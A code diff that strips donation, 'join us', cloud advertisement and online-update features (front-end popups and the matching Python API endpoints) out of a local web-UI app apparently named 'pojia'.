-    $("#don-btns").style.display="none";
-  }
-};
-$("#b-don-later").onclick=()=>{
-  try{localStorage.setItem("pojia_donated_seen","1");}catch(e){}
-  $("#donateveil").classList.remove("show");
-};
-$("#b-don-ok").onclick=()=>{
-  try{localStorage.setItem("pojia_donated_seen","1");}catch(e){}
-  $("#donateveil").classList.remove("show");toast("感谢支持！");
-};
-/* 所有浮层：点遮罩空白处关闭（强制更新窗除外，不许绕过） */
-document.addEventListener("click",e=>{
-  const v=e.target;
-  if(!v.classList||!v.classList.contains("veil")||!v.id)return;
-  if(v.id==="updateveil"&&v.dataset.force==="1")return;
-  v.classList.remove("show");
-});
-
-function hideVeils(){$("#joinveil").classList.remove("show");}
-$("#vl-tg").onclick=joinTG;
-$("#b-joinus").onclick=()=>{hideVeils();joinTG();};
-$("#b-joined").onclick=()=>{
-  try{localStorage.setItem("pojia_joined","1");}catch(e){}
-  hideVeils();toast("欢迎加入！");};
-$("#topjoin").onclick=showJoinVeil;
-$("#topdonate").onclick=(e)=>{e.preventDefault();showDonate();};
-$("#topupdate").onclick=async(e)=>{
-  e.preventDefault();toast("正在检查更新…");
-  try{await fetch("/api/update/check",{method:"POST"});}catch(err){toast("检查失败："+err);}
-};
-
-/* ---- 首启浮层编排（v8.7）：更新 > 捐赠 > 加入我们，一次只弹一个 ---- */
-let _veilSeq=0;
-function anyVeilOpen(){
-  return ["updateveil","donateveil","joinveil"]
-    .some(id=>{const el=document.getElementById(id);return el&&el.classList.contains("show");});
-}
-function bootVeils(){
-  _veilSeq=0;
-  // 加入我们（没点过才排）
-  try{if(localStorage.getItem("pojia_joined")!=="1")_veilSeq|=1;}catch(e){_veilSeq|=1;}
-  // 捐赠（没点过「下次一定」才排）
-  try{if(localStorage.getItem("pojia_donated_seen")!=="1")_veilSeq|=2;}catch(e){_veilSeq|=2;}
-  _veilSeqRun();
-}
-function _veilSeqRun(){
-  // 更新窗由 Python 侧强制弹出，这里只错开时间放捐赠 / 加入
-  setTimeout(()=>{
-    if(anyVeilOpen()){_veilSeqTryAgain();return;}
-    if(_veilSeq&2){_veilSeq&=~2;showDonate();_nextAfterClose();}
-    else if(_veilSeq&1){_veilSeq&=~1;$("#joinveil").classList.add("show");}
-  },1400);
-}
-function _nextAfterClose(){
-  if(!(_veilSeq&1))return;
-  const t=setInterval(()=>{
-    if(!anyVeilOpen()){clearInterval(t);_veilSeq&=~1;$("#joinveil").classList.add("show");}
-  },700);
-  setTimeout(()=>clearInterval(t),20000);
-}
-function _veilSeqTryAgain(){setTimeout(_veilSeqRun,1800);}
-
-/* ---- 广告位（商业化预留，v8.7）：默认隐藏；有内容才显示 ---- */
-function setAd(html,link){
-  const wrap=document.getElementById("adwrap"),slot=document.getElementById("adslot");
-  if(!wrap||!slot)return;
-  if(!html){wrap.style.display="none";slot.innerHTML="";wrap.onclick=null;wrap.style.cursor="";return;}
-  slot.innerHTML=html;wrap.style.display="block";
-  // 整块广告可点：点任意位置调系统浏览器打开落地页（v8.7 商业化）
-  wrap.style.cursor="pointer";
-  wrap.onclick=()=>{if(link)openExt(link);};
-  wrap.title="点击了解详情";
-}
-async function loadAd(){
-  try{
-    const r=await fetch("/api/ad");const j=await r.json();
-    if(j&&j.enabled&&j.html){setAd(j.html,j.link||"");}
-  }catch(e){}
-}
-
 /* ---- 启动 ---- */
 function appBoot(){
-  if(!window.__pojiaBooted){window.__pojiaBooted=true;bootVeils();loadAd();}
+  if(window.__pojiaBooted)return;window.__pojiaBooted=true;
   loadState();loadPersona();pullLog();
   setTimeout(()=>movePill(document.querySelector(".tab.on")),60);
   setInterval(async()=>{   // 闲时 8s 刷一次目标页
@@ -3056,12 +2346,6 @@ class Handler(BaseHTTPRequestHandler):
                     "busy_label": _ENV["busy_label"],
                     "busy_key": _ENV["busy_key"],
                 })
-        if self.path == "/api/donate":
-            return self._json({"ok": True, "image": _donate_qr_uri()})
-        if self.path == "/api/ad":
-            # v8.7：云端广告（服务器 /pojia/ad 下发 enabled/html/link），
-            # 拉取失败或未启用 → enabled:false，广告位保持隐藏
-            return self._json(_ad_fetch())
         if self.path == "/api/skills":
             installed = _scan_installed_skills()
             inst_names = {s["name"] for s in installed}
@@ -3079,15 +2363,6 @@ class Handler(BaseHTTPRequestHandler):
             req = json.loads(raw.decode("utf-8") or "{}")
         except Exception:
             return self._json({"ok": False, "err": "请求体不是合法 JSON"}, 400)
-
-        if self.path == "/api/update/check":
-            _update_async(interactive=True)
-            return self._json({"ok": True})
-
-        if self.path == "/api/update/inline":
-            # v8.7 在线更新：弹目录选择 → 后台静默下载（阻塞至选完目录才返回）
-            ok, msg = _update_inline_start()
-            return self._json({"ok": ok, "msg": msg})
 
         if self.path == "/api/skill/install":
             src = str(req.get("src") or "")
